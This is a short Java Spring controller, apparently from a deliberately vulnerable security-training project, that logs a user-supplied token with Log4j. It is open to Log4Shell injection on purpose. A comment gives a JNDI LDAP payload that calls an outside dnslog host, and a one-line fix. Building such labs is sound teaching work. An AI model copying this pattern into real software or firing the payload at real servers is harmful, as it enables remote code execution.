package org.joychou.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Log4j {

    private static final Logger logger = LogManager.getLogger("Log4j");

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://wffsr5.dnslog.cn:9999}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     * @param token token
     */
    @GetMapping("/log4j")
    public String log4j(String token) {
        if(token.equals("java-sec-code")) {
            return "java sec code";
        } else {
            logger.error(token);
            return "error";
        }
    }

}
